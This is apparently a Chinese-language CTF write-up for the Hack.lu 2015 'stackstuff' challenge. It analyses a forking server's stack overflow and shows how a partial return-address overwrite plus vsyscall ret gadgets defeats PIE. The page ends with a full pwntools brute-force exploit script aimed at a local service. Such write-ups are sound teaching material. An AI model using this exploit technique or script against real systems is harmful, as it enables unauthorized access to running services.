---
title: nightmare 7.1.1.Hacklu2015-stackstuff-wp
date: 2023-09-03 14:25:29
tags:
- CTF
- pwn
- stack 
- partial overwrite  
- Hacklu2015
- nightmare
categories:
- pwn-wp
---

[相关资源](https://github.com/guyinatuxedo/nightmare/tree/master/modules/15-partial_overwrite/hacklu15_stackstuff)  

## 文件分析

```sh
$ checksec stackstuff 
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## 代码分析

### main

`14#`设定在端口1514监听，`24#accept`接收到socket之后fork出子进程，执行`37#execl`，即执行到`4#handle_request`

```c
int __cdecl main(int argc, const char **argv, const char **envp) {
   // [...]
    if (!strcmp(*argv, "reexec")) {
        handle_request();
        return 0;
    } else {
        v4 = socket(10, 1, 0);
        fd = negchke(v4, "unable to create socket");
        *(_QWORD *)&addr.sa_family = 10LL;
        *(_QWORD *)&addr.sa_data[6] = 0LL;
        v15 = 0LL;
        v16 = 0;
        *(_WORD *)addr.sa_data = htons(1514u);
        optval = 1;
        v5 = setsockopt(fd, 1, 2, &optval, 4u);
        negchke(v5, "unable to set SO_REUSEADDR");
        v6 = bind(fd, &addr, 0x1Cu);
        negchke(v6, "unable to bind");
        v7 = listen(fd, 16);
        negchke(v7, "unable to listen");
        signal(17, (__sighandler_t)((char *)&dword_0 + 1));
        while (1) {
            v8 = accept(fd, 0LL, 0LL);
            v18 = negchke(v8, "unable to accept");
            v9 = fork();
            if (!(unsigned int)negchke(v9, "unable to fork"))
                break;
            close(v18);
        }
        close(fd);
        v10 = dup2(v18, 0);
        negchke(v10, "unable to dup2");
        v11 = dup2(v18, 1);
        negchke(v11, "unable to dup2");
        close(v18);
        v12 = execl("/proc/self/exe", "reexec", 0LL);
        negchke(v12, "unable to reexec");
        return 0;
    }
}
```

### handle_request

读取密码，`15#require_auth`进行验证，验证通过输出flag

```c
int handle_request() {
    char v1[64];  // [rsp+0h] [rbp-58h] BYREF
    FILE *v2;     // [rsp+40h] [rbp-18h]
    FILE *stream; // [rsp+48h] [rbp-10h]

    alarm(0x3Cu);
    setbuf(stdout, 0LL);
    stream = fopen("password", "r");
    if (!stream || !fgets(real_password, 50, stream)) {
        fwrite("unable to read real_password\n", 1uLL, 0x1DuLL, stderr);
        exit(0);
    }
    fclose(stream);
    puts("Hi! This is the flag download service.");
    require_auth();
    v2 = fopen("flag", "r");
    if (!v2 || !fgets(v1, 50, v2)) {
        fwrite("unable to read flag\n", 1uLL, 0x14uLL, stderr);
        exit(0);
    }
    return puts(v1);
}
```

### require_auth  -> check_password_correct

读取长度，超过50则置为90，明显栈溢出

```c
_BOOL8 check_password_correct() {
    size_t v0;    // rax
    int v2;       // [rsp+Ch] [rbp-4Ch] BYREF
    char ptr[50]; // [rsp+10h] [rbp-48h] BYREF

    memset(ptr, 0, sizeof(ptr));
    puts("To download the flag, you need to specify a password.");
    printf("Length of password: ");
    v2 = 0;
    if ((unsigned int)__isoc99_scanf("%d\n", &v2) != 1)
        exit(0);
    if (v2 <= 0 || v2 > 50)
        v2 = 90;
    v0 = fread(ptr, 1uLL, v2, stdin);
    if (v0 != v2)
        exit(0);
    return strcmp(ptr, real_password) == 0;
}
```

## 攻击方法

### 子进程中check_password_correct调试方法

```sh
# terminal 1
$ gdb stackstuff
gef➤  set follow-fork-mode child
gef➤  b check_password_correct
gef➤  r

# 然后在另一个terminal 2
$ nc 127.0.0.1 1514

# terminal 1 中即可看到运行到check_password_correct
```

程序虽然存在栈溢出，但是开了PIE也没有泄露的地方  首先想着能不能直接覆盖返回地址的低位字节控制跳转

gdb调试进入到`check_password_correct`，获取输入到ret_addr的偏移量为`0x7fffffffe398 - 0x007fffffffe350 = 0x48`  

```assembly
───────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555400f7e → check_password_correct()
[#1] 0x555555400fd1 → require_auth()
[#2] 0x55555540108b → handle_request()
[#3] 0x55555540112d → main()

gef➤  info f
Stack level 0, frame at 0x7fffffffe3a0:
 rip = 0x555555400f7e in check_password_correct; saved rip = 0x555555400fd1
 called by frame at 0x7fffffffe3b0
 Arglist at 0x7fffffffe338, args: 
 Locals at 0x7fffffffe338, Previous frame's sp is 0x7fffffffe3a0
 Saved registers:
  rip at 0x7fffffffe398	# ret addr

gef➤  stack 15
────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffe340│+0x0000: 0x007ffff7f98760  →  0x00000000fbad2887	 ← $rsp
0x007fffffffe348│+0x0008: 0x0000005af7e47283
0x007fffffffe350│+0x0010: "afdsfasdfasdf\ngasfdasffffffffffffffffffffffffffff[...]"
0x007fffffffe358│+0x0018: "fasdf\ngasfdasffffffffffffffffffffffffffffffffffff[...]"
0x007fffffffe360│+0x0020: "sfdasfffffffffffffffffffffffffffffffffffffffffff\n"
0x007fffffffe368│+0x0028: "ffffffffffffffffffffffffffffffffffffffff\n"
0x007fffffffe370│+0x0030: "ffffffffffffffffffffffffffffffff\n"
0x007fffffffe378│+0x0038: "ffffffffffffffffffffffff\n"
0x007fffffffe380│+0x0040: "ffffffffffffffff\n"
0x007fffffffe388│+0x0048: "ffffffff\n"
0x007fffffffe390│+0x0050: 0x0000000000000a ("\n"?)
0x007fffffffe398│+0x0058: 0x00555555400fd1  →  <require_auth+23> test eax, eax
0x007fffffffe3a0│+0x0060: 0x0000000000000000
0x007fffffffe3a8│+0x0068: 0x0055555540108b  →  <handle_request+177> lea rsi, [rip+0x36d]        # 0x5555554013ff
0x007fffffffe3b0│+0x0070: 0x0000000000000000
```

但是read长度为`90 == 0x5a`，所以还要往下写0x12个字节，那么整个返回地址都会被覆盖掉，这个方法也就不行了

但是发现能刚刚好覆盖`0x0x007fffffffe3a8`处上层栈帧的返回地址的最低两个字节，即`require_auth`成功执行结束后开始读取flag的地址，明显也就是我们想要的跳转地址

```assembly
.text:000000000000106D loc_106D:
.text:000000000000106D mov     rax, [rsp+58h+stream]
.text:0000000000001072 mov     rdi, rax        ; stream
.text:0000000000001075 call    _fclose
.text:000000000000107A lea     rdi, aHiThisIsTheFla ; "Hi! This is the flag download service."
.text:0000000000001081 call    _puts
.text:0000000000001086 call    require_auth
.text:000000000000108B lea     rsi, modes      ; "r"
.text:0000000000001092 lea     rdi, aFlag      ; "flag"
.text:0000000000001099 call    _fopen
```

现在目标就是在栈上写两个`ret`指令的地址并覆盖`0x0x007fffffffe3a8`处最低两个字节保持地址值不变即可

### vsyscall

即使开了PIE随机化，还有一个`vsyscall`段，它的地址是固定的，其中有ret指令可以满足我们的要求

```assembly
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]		# here  （环境为ubuntu22.08）
gef➤  x/4i 0xffffffffff600800
   0xffffffffff600800:    mov    rax,0x135
   0xffffffffff600807:    syscall
   0xffffffffff600809:    ret    
   0xffffffffff60080a:    int3
```

注意不论怎么随机化最低12bit的`08b`是不变的（页对齐），因此需要爆破倒数第二个字节，但最多也只需爆破16次，即从`0x008b,0x108b...0xf08b`

## exp

```python
from pwn import *

pty = process.PTY
context(os='linux', arch='amd64', log_level='debug')

rdbyte = 0x00
while True:
    client = remote("localhost", 1514)
    client.sendlineafter(b'Length', b'60')
    payload = b'h' * 0x48 + p64(0xffffffffff600800) * 2		# padding 加上两次ret
    payload += b'\x8b' + p8(rdbyte)		# 覆盖倒数两个字节
    rdbyte += 0x10	# 爆破
    client.sendline(payload)
    if b'{' in client.recvall():
        break
    client.close()
# flag{g0ttem_b0yz}
```

